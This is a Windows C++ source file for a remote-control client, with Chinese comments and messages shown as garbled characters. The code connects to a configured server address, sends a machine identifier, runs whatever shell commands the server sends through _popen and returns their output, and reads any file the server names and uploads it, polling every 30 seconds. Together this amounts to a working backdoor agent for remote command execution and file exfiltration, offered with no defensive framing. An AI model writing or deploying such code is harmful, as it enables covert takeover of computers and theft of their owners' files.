// Client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

#define REMOTE_PORT			4000
#define REMOTE_IP_ADDRESS "127.0.0.1"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	18
#define DEFAULT_BUFLEN  1024
char MacAddr[MAC_ADDR_LEN];
char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //��1024�Ŀռ����洢��������ݣ�ֻҪ������ʾ�ļ����ݣ�һ��������ǹ����ˡ�  

int getFileSizeSystemCall(char * strFileName)
{
	struct stat temp;
	stat(strFileName, &temp);
	return temp.st_size;
}

void init()
{
	// get mac address
	memset(MacAddr, 0, MAC_ADDR_LEN);
	GUID uuid;
	CoCreateGuid(&uuid);
	// Spit the address out
	sprintf(MacAddr, "%02X:%02X:%02X:%02X:%02X:%02X",
		uuid.Data4[2], uuid.Data4[3], uuid.Data4[4],
		uuid.Data4[5], uuid.Data4[6], uuid.Data4[7]);
	cout << "����mac��ַΪ"<<MacAddr << endl;
	return;
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //�洢����recv�����ķ���ֵ
	int cnt;         //����ͳ������ڹ̶����ȣ�ʣ������ֽ���δ����
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//���ݽ��ճ��ִ��󣬷���ʧ��
			printf("���շ�������: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//�Է��ر����ӣ������ѽ��յ���С��fixedlen���ֽ���
			printf("���ӹر�\n");
			return fixedlen - cnt;
		}
		//printf("���յ����ֽ���: %d\n", iResult);
		//���ջ���ָ������ƶ�
		recvbuf +=iResult;
		//����cntֵ
		cnt -=iResult;         
	}
	return fixedlen;
}

char *execute_cmd(char *strCmd)
{
	return "";
}

bool execmd(char* cmd, char* result) {
	char buffer[DEFAULT_BUFLEN];                         //���建����                        
	FILE* pipe = _popen(cmd, "r");            //�򿪹ܵ�����ִ������ 
	if (!pipe)
		return 0;                      //����0��ʾ����ʧ�� 

	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe)) {             //���ܵ������result�� 
			strcat(result, buffer);
		}
	}
	_pclose(pipe);                            //�رչܵ� 
	cout << result << endl;
	return 1;                                 //����1��ʾ���гɹ� 
}

int main(int argc, char * argv[])
{
	WSADATA Ws;
	SOCKET ClientSocket;
	struct sockaddr_in ServerAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	char SendBuffer[MAX_PATH];
	unsigned int reclen;
	char CmdBuff[MAX_CMD_LEN];
	char strCmdNo[2];
	char *pStrCmd;
	int CmdNo;
	
	init();//get mac

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//Create Socket
	ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ClientSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = inet_addr(REMOTE_IP_ADDRESS);
	ServerAddr.sin_port = htons(REMOTE_PORT);
	memset(ServerAddr.sin_zero, 0, 8);

	Ret = connect(ClientSocket,(struct sockaddr*)&ServerAddr, sizeof(ServerAddr));
	if ( Ret == SOCKET_ERROR )
	{
		cout<<"Connect Error::"<<GetLastError()<<endl;
		return -1;
	}
	else
	{
		cout << endl;
		cout << "                                           *------------------------------*" << endl;
		cout << "                                           |        �ɹ������ͻ���        |" << endl;
		cout << "                                           |  mac��ַ ��" << MacAddr << " |" << endl;
		cout << "                                           |  IP��ַ  ��" << inet_ntoa(ServerAddr.sin_addr) << "         |" << endl;
		cout << "                                           |  �˿ڵ�ַ��" << ntohs(ServerAddr.sin_port) << "              |" << endl;
		cout << "                                           *------------------------------*" << endl;
	}

	cout << "��ʼ����������н���" << endl;
	while ( true )
	{
		//cin.getline(SendBuffer, sizeof(SendBuffer));
		// send mac address
		Ret = send(ClientSocket, MacAddr, MAC_ADDR_LEN, 0);
		cout << "����mac��ַ��" << MacAddr << endl;
		if ( Ret != MAC_ADDR_LEN )
		{
			cout<<"Send Info Error::"<<GetLastError()<<endl;
			break;
		}

		//
		// recv cmd information
		//
		Ret = recvn(ClientSocket, ( char * )&reclen, sizeof( unsigned int ));
		if ( Ret !=sizeof( unsigned int ) )
		{
			printf("�����쳣");
			break;
		}
		//ת�������ֽ�˳�������ֽ�˳��
		reclen = ntohl( reclen );
		if(reclen>2&&reclen<100)cout << "���յ�" << reclen-2 <<"�ֽ�����"<< endl;

		//
		// recv cmd information
		//
		memset(CmdBuff, 0, MAX_CMD_LEN);
		if(reclen > 0)
		{
			bool suc;
			char * error = "�ͻ���ִ�и�����ʱ�����쳣��\n";
			Ret = recvn(ClientSocket, CmdBuff, reclen);
			if(Ret != reclen)
				break;
			cout << "ִ��ָ�" << endl;
			strCmdNo[0] = CmdBuff[0];
			strCmdNo[1] = '\0';
			CmdNo = atoi(strCmdNo);
			pStrCmd = CmdBuff + 2;
			cout << "ָ������Ϊ"<<CmdNo<<endl;
			switch(CmdNo)
			{
			case CMD_CMD:
				printf("cmd: %s\n", pStrCmd);
				// execute cmd and send result to server
				memset(cmdbuffer, 0, sizeof(cmdbuffer));
				suc = execmd(pStrCmd,cmdbuffer);
				int iResult;
				if (suc) iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
				else iResult = send(ClientSocket, error, DEFAULT_BUFLEN, 0);
				if (iResult == SOCKET_ERROR) {
					printf("����ʧ�ܣ�������: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					WSACleanup();
					return 1;
				}
				break;

			case CMD_DOWNLOAD:
				// read file and send to server
				printf("download file: %s\n", pStrCmd);
				
				char sendbuf[DEFAULT_BUFLEN];
				FILE *file = NULL;
				char *filename = pStrCmd;
				file = fopen(filename, "rb");
				int filelen = getFileSizeSystemCall(filename);
				cout << "���ݳ���Ϊ  " << filelen << endl;

				int invfilelen = htonl(filelen);
				cout << "���ݳ���ת��Ϊ�����ֽ���Ϊ  " << invfilelen << endl;
				/*char *filelenchar;
				filelenchar = (char *)(&invfilelen);*/

				iResult = send(ClientSocket, (char *)(&invfilelen), 4, 0);//�����ļ�����

				int tosendlen = filelen;

				// ���ͻ������еĲ�������
				while (tosendlen > 0)
				{
					cout << "����" << tosendlen << "���ֽ���Ҫ����" << endl;
					fread(sendbuf, 1, DEFAULT_BUFLEN, file);
					int iSend = DEFAULT_BUFLEN;
					if (tosendlen < DEFAULT_BUFLEN) iSend = tosendlen;
					iResult = send(ClientSocket, sendbuf, iSend, 0);
					printf("װ��ɹ���\n");

					if (iResult == SOCKET_ERROR) {
						printf("����ʧ�ܣ�������: %d\n", WSAGetLastError());
						closesocket(ClientSocket);
						WSACleanup();
						return 1;
					}
					//printf("����ɹ�: %s(%ld)\n\n", sendbuf, iResult);
					tosendlen -= iResult;
				}

				fclose(file);

				cout << "�ļ����سɹ���" << endl;

				break;
			}
		}
		
		Sleep(30*1000);
	}

	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}